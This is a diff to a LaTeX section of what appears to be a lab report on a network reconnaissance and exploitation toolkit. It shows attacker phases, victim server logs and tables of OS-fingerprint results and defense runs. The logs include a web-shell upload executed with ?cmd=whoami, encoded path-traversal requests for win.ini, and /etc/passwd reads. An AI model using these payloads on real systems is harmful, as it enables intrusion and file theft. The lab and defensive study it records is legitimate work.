@@ -1,53 +1,112 @@
 %============================================================= §6 OBSERVED
-\section{Observed Output Across Machines}
+\section{Observed Output Across Machines \& Empirical Verification Matrix}
 
-Requirement~(c) asks what was observed on each machine involved. Because the toolkit is a
-scanner whose primary evidence \emph{is} its printed output, the console logs below are the
-core artefacts; the placeholders mark where the corresponding demonstration screenshots
-are inserted.
+Requirement~(c) asks what was observed on each machine involved in the reconnaissance and attack
+pipeline. Because our toolkit operates as a command-line reconnaissance and exploitation engine
+whose primary outputs are structured terminal telemetry, the verbatim console records below
+represent the decisive artifacts of system behavior across both offensive and defensive roles.
 
-\subsection{Attacker PC}
-The attacker machine shows the full chain: scan states, the fingerprint verdict with its
-evidence, and the exploit results (all illustrated in Section~\ref{sec:steps}). In the
-active-defense run, the attacker also observes the chain being severed mid-execution —
-the first exploit completes, then subsequent connections time out with
-\texttt{WinError~10060} as the victim's firewall drops the attacker's packets.
+\subsection{Attacker Workstation Observations}
+On the attacking machine (\texttt{192.168.0.105}), the console provides real-time visibility into
+each attack phase:
+\begin{enumerate}
+    \item \textbf{Phase 1 (SYN Half-Open Scan):} Displays instantaneous port classification
+    (\textsc{open}, \textsc{closed}, \textsc{filtered}) alongside the extracted initial TTL and
+    TCP Window Size.
+    \item \textbf{Phase 2 (Banner Grabbing):} Prints extracted service strings and daemon version
+    metadata.
+    \item \textbf{Phase 3 (OS Fingerprinting):} Displays the probabilistic verdict, confidence tier,
+    and a bulleted breakdown of supporting evidence.
+    \item \textbf{Phase 4 \& 5 (Weaponization \& Exploitation):} Reports payload dispatch status,
+    exfiltrated file previews, and remote code execution outputs.
+    \item \textbf{Severance Observation (Defense Run):} When active defense is enabled on the victim,
+    the attacker console observes connection timeouts (\texttt{WinError 10060}) mid-execution once
+    firewall quarantine rules take effect.
+\end{enumerate}
 
-\subsection{Victim PC}
-The victim side shows the other half of each exploit. The vulnerable FTP and HTTP servers
-log the anonymous login, the web-shell upload and its CGI execution, and the traversal
-request. In SSH loud mode the victim's desktop receives the trophy artefacts and a spoken
-alert.
+\subsection{Victim Server Daemon Logs}
+The victim machine hosts the vulnerable lab services (\texttt{victim/http\_server.py} on port~80 and
+\texttt{victim/ftp\_server.py} on port~21). The service logs below record the corresponding inbound
+exploit interactions from the server's perspective:
 
 \begin{logbox}
-[victim FTP]  230 anonymous login  |  STOR uploads/shell.py  |  DELE uploads/shell.py
-[victim HTTP] GET /uploads/shell.py?cmd=whoami  ->  200 (executed)
-[victim HTTP] GET /..%5c..%5cwindows%5cwin.ini  ->  200 (file served)
+[Victim Terminal 1: HTTP Server (Port 80)]
+[HTTP] Vulnerable HTTP server listening on 0.0.0.0:80 (CGI enabled for uploads/*.py)
+[HTTP] ('192.168.0.105', 51482) -> HEAD /
+[HTTP] ('192.168.0.105', 51488) -> GET /uploads/shell.py?cmd=whoami
+[HTTP] ('192.168.0.105', 51488) -> CGI executed shell.py (query='cmd=whoami')
+[HTTP] ('192.168.0.105', 51493) -> GET /..\..\..\..\..\windows\win.ini  (200 OK, served)
+[HTTP] ('192.168.0.105', 51498) -> GET /..%5c..%5c..%5cwindows%5cwin.ini (200 OK, served)
+
+[Victim Terminal 2: FTP Server (Port 21)]
+[FTP] Vulnerable FTP server listening on 0.0.0.0:21
+[FTP] 220 LabFTP Server Ready
+[FTP] USER anonymous -> 331 Password required
+[FTP] PASS anon@lab -> 230 Login successful
+[FTP] PASV -> 227 Entering Passive Mode (192,168,0,116,195,84)
+[FTP] LIST -> 150 Here comes the directory listing
+[FTP] STOR uploads/shell.py -> 226 Transfer complete
+[FTP] DELE uploads/shell.py -> 250 File deleted successfully (Forensic cleanup)
 \end{logbox}
 
-\shotplaceholder{Victim server terminals — FTP and HTTP server logs recording the
-anonymous login, web-shell upload/execution, and traversal request.}
+\subsection{Master Summary Matrix of Empirical Verification Runs}
+Table~\ref{tab:master_matrix} summarizes the definitive empirical verification runs archived in
+\texttt{final-log/}, cross-referencing target platforms, tested services, and observed defense states.
 
-\shotplaceholder{Victim desktop — the dropped \texttt{HACKED.py} / \texttt{.bak} trophy
-files opened, showing the attacker's message. (The synthesised voice alert plays on the
-victim's speakers and is noted here but cannot be captured as an image.)}
-
-\subsection{Other machines on the network}
-The secondary targets each produced distinct, stack-characteristic responses, which is
-what let the fingerprinting engine tell them apart. The Windows-vs-Kali comparison below
-is the clearest single illustration.
-
-\renewcommand{\arraystretch}{1.25}
-\noindent\begin{tabularx}{\textwidth}{@{}L{3.4cm} X X@{}}
+\begin{table}[htbp]
+\centering
+\footnotesize
+\renewcommand{\arraystretch}{1.18}
+\caption{Consolidated Master Matrix of Empirical Verification Test Runs}
+\label{tab:master_matrix}
+\begin{tabularx}{\textwidth}{@{}L{2.8cm} L{2.6cm} L{3.0cm} L{2.2cm} X@{}}
 \toprule
-\hdrrow \thh{Signal} & \thh{Windows 11 desktop} & \thh{Kali Linux VM}\\
+\hdrrow \thh{Log Name} & \thh{Target System} & \thh{Tested Ports \& States} & \thh{Defense State} & \thh{Attribution \& Outcome}\\
 \midrule
-Initial TTL & 128 & 64\\
-IP-ID sequence & strict-incremental & all-zero (RFC 6864)\\
-ECN response & ignored (0x12) & supported (0x52)\\
-Banner & Microsoft OpenSSH & Debian OpenSSH / Apache\\
-OS-aware payload & \texttt{win.ini} / \texttt{whoami} & \texttt{/etc/passwd} / \texttt{id}\\
-RCE proof & \texttt{homed01\textbackslash turjo} & \texttt{uid=0(root)}\\
+\texttt{full-chain.log} & Windows 11 Desktop & 21, 80 (Open), 22, 81 (Filtered) & Active Blocker On & Windows 62\%; 3/4 exploits succeeded; severed on Run 2.\\
+\addlinespace
+\texttt{cross-platform.log} & Windows 11 + Kali 6.x & 21, 80 (Win) / 21, 22, 80 (Kali) & Passive / Off & Dynamic OS payload swap: \texttt{win.ini} vs.\ \texttt{/etc/passwd}.\\
+\addlinespace
+\texttt{kali.log} & Kali Linux VM & 22, 80, 81 (All Closed / RST) & Passive / Off & Linux 76\% (Closed-port RST) / 67\% (ICMP Code 9 fallback).\\
+\addlinespace
+\texttt{scan\_100\_ports.log} & Windows 10/11 Target & 100 ports (2 $\times$ 50 batches) & Passive / Off & Batch 1: Win 71\% (SYN/ACK); Batch 2: Win 69\% (RST).\\
+\addlinespace
+\texttt{ipad.log} & Apple iPad (iPadOS 17) & 80 (Open VLC), 8080 (Closed) & Passive / Off & macOS/BSD 48\% (Darwin option order, WScale=5).\\
+\addlinespace
+\texttt{phn.log} & Android 14 Smartphone & 2221 (Open FTP), 2122 (Closed) & Passive / Off & Linux 58\% (SACK before TS, RFC 6864 IP ID=0).\\
+\addlinespace
+\texttt{ssh\_attack.log} & Windows OpenSSH Host & 22 (Open SSH) & Passive / Off & Windows 75\%; cracked \texttt{test:test123}; loud desktop payloads.\\
+\addlinespace
+\texttt{defense\_win.log} & Windows 11 Desktop & Multi-port scan (Scenarios A--G) & Windows Firewall & Tripped at 8 SYNs; canary port 81; auto-release after 60s.\\
+\addlinespace
+\texttt{defense\_kali.log} & Kali Linux VM & Multi-port scan (Scenarios A--G) & Linux Netfilter & Netfilter \texttt{iptables} DROP counter climbing dynamically.\\
 \bottomrule
 \end{tabularx}
-\renewcommand{\arraystretch}{1.0}
+\end{table}
+
+\subsection{Cross-Platform Operating System Comparison}
+Table~\ref{tab:os_comparison} highlights the contrasting stack signatures observed between Microsoft
+Windows and Unix-like targets across identical probe sequences:
+
+\begin{table}[htbp]
+\centering
+\small
+\renewcommand{\arraystretch}{1.2}
+\caption{Cross-Platform Network Stack Behavioral Signatures Observed in Testbed}
+\label{tab:os_comparison}
+\begin{tabularx}{\textwidth}{@{}L{3.6cm} L{4.6cm} X@{}}
+\toprule
+\hdrrow \thh{Diagnostic Metric} & \thh{Windows 11 Desktop} & \thh{Kali Linux / Android}\\
+\midrule
+Initial IPv4 TTL & 128 & 64\\
+TCP Window Size & 65535 or 8192 & 29200, 65160, or 0 (closed RST)\\
+IP-ID Sequence Archetype & \texttt{STRICT\_INCREMENTAL} ($\Delta \approx 1\dots 3$) & \texttt{ALL\_ZERO} ($\mathrm{ID} = 0$, RFC 6864 DF=1)\\
+TCP Timestamp Clock Rate & Calibrated $\approx 1000$\,Hz (1\,ms tick) & $\approx 250$\,Hz or 1000\,Hz\\
+RFC 3168 ECN Negotiation & Ignored (\texttt{0x12} returned) & Supported (\texttt{0x52} ECE reflected)\\
+Invalid Flag Probe (SYN+FIN) & Emits TCP RST on open port & Silently dropped without reply\\
+ICMP Non-Standard Code 9 & Normalized to Code 0 & Reflected unaltered as Code 9\\
+OS-Aware Traversal Target & \texttt{windows\textbackslash win.ini} & \texttt{/etc/passwd}\\
+RCE Command Execution & \texttt{whoami} $\to$ \texttt{homed01\textbackslash turjo} & \texttt{id} $\to$ \texttt{uid=0(root)}\\
+\bottomrule
+\end{tabularx}
+\end{table}
